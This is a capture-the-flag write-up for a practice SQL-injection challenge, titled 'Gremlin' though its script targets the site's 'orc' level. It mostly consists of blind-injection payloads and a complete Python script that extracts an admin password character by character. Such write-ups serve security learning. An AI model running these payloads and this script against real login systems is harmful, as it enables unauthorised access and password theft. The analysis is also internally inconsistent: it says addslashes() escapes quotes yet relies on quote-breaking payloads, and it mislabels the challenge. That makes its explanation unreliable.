# SQL Injection on Gremlin Challenge

## Challenge Analysis

### Code Review
1. **PHP Code Analysis:**
    - The provided PHP code connects to a database and attempts to authenticate based on an `id` and a parameter `pw`.
    - The code includes checks to prevent certain SQL injection characters, specifically:
        - It blocks keywords like `prob`, `_`, `.`, and `()` by regex matching in the `pw` parameter.
        - It also uses `addslashes()` to escape quotes (`'`, `"`, and `\`), making classic injection techniques more difficult.
    - The query is executed twice:
        - First, to check if the `id` is `admin` and the `pw` matches the input.
    - Second, to verify if the retrieved `pw` matches the input `pw` exactly.
2. **SQL Query Structure:**
    - The SQL query generated is:
    ```sql
    select id from prob_orc where id='admin' and pw='{$_GET[pw]}'
    ```
    - The goal is to bypass the filters and inject SQL into the `pw` parameter to make the query return the `id` of `admin`.

3. **Objective:**
    - Our goal is to extract the pw for the admin account by performing a blind SQL injection. This involves guessing the password character by character.

### Bypass Strategy
1. **Blind SQL Injection:**
    - Since the application does not directly display database errors or data, we need to use a blind SQL injection technique.
    - We can use the `LIKE` operator to guess each character of the password sequentially.
2. **Formulating the Injection Payload:**
    - We can craft a payload that checks if a specific character of the password matches a guessed value:
    ```sql
    ' or id='admin' and substring(pw,1,1)='a' -- 
    ```
    - This payload checks if the first character of the password is `'a'`. If true, the query will return the `id` of `admin`.
3. **Automating the Process:**
    - To efficiently guess the password, we can write a Python script that iterates through possible characters and positions in the password.

## Solution Steps
### Step 1: Determine the Password Length
1. **Payload:**
    - We first need to determine the length of the password. We can use the following payload:
    ```sql
    ' or id='admin' and length(pw)=8 -- 
    ```
    - This checks if the password length is 8 characters.
2. **Script Implementation:**
    - The script iterates through possible lengths and checks for a successful response:
    ```python
    def get_password_length():
        for i in range(1, 20):
            payload = f"' or id='admin' and length(pw)={i} -- "
            params = {"pw": payload}
            response = requests.get(url, params=params, cookies=cookies)
            if "Hello admin" in response.text:
                return i
        return 0
    ```
3. **Result:**
    - The script determines that the password is 8 characters long.
### Step 2: Extract the Password
1. **Payload:**
    - For each character position, we guess the character using the following payload:
    ```sql
    ' or id='admin' and substring(pw,{position},1)='{character}' -- 
    ```
    - This checks if the character at the specified position matches the guessed value.
2. **Script Implementation:**
    - The script iterates through each character position and possible characters:
    ```python
    def get_password(password_length):
        password = ""
        for i in range(1, password_length + 1):
            for char in "0123456789abcdefghijklmnopqrstuvwxyz":
                payload = f"' or id='admin' and substring(pw, {i}, 1)='{char}' -- "
                params = {"pw": payload}
                response = requests.get(url, params=params, cookies=cookies)
                if "Hello admin" in response.text:
                    password += char
                    print(f"Found character {i}: {char}")
                    break
        return password
    ```
3. **Result:**
    - The script successfully extracts the password.
### Step 3: Submit the Password
1. **Payload:**
    - Once the password is known, we submit it to solve the challenge:
    ```sql
    ?pw=<password>
    ```
2. **Script Implementation:**
    - The script submits the password and checks for a success message:
    ```python
    def solve_challenge(password):
        params = {"pw": password}
        response = requests.get(url, params=params, cookies=cookies)
        if "Clear" in response.text:
            print("Challenge solved!")
        else:
            print("Failed to solve the challenge.")
    ```
3. **Result:**
    - The challenge is solved, and the success message is displayed.

## Full Python Script
```python
import requests

# Configuration
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
cookies = {"PHPSESSID": "your_session_id"}  # Replace with your session ID

# Step 1: Determine the password length
def get_password_length():
    for i in range(1, 20):
        payload = f"' or id='admin' and length(pw)={i} -- "
        params = {"pw": payload}
        response = requests.get(url, params=params, cookies=cookies)
        if "Hello admin" in response.text:
            return i
    return 0

# Step 2: Extract the password
def get_password(password_length):
    password = ""
    for i in range(1, password_length + 1):
        for char in "0123456789abcdefghijklmnopqrstuvwxyz":
            payload = f"' or id='admin' and substring(pw, {i}, 1)='{char}' -- "
            params = {"pw": payload}
            response = requests.get(url, params=params, cookies=cookies)
            if "Hello admin" in response.text:
                password += char
                print(f"Found character {i}: {char}")
                break
    return password

# Step 3: Solve the challenge
def solve_challenge(password):
    params = {"pw": password}
    response = requests.get(url, params=params, cookies=cookies)
    if "Clear" in response.text:
        print("Challenge solved!")
    else:
        print("Failed to solve the challenge.")

# Main execution
password_length = get_password_length()
print(f"Password length: {password_length}")

if password_length:
    password = get_password(password_length)
    print(f"Password: {password}")
    solve_challenge(password)
else:
    print("Could not determine password length.")
```

## Conclusion
By analyzing the challenge and using a blind SQL injection technique, we successfully extracted the password and solved the challenge. This approach demonstrates how to bypass filters and automate the extraction of sensitive data using Python.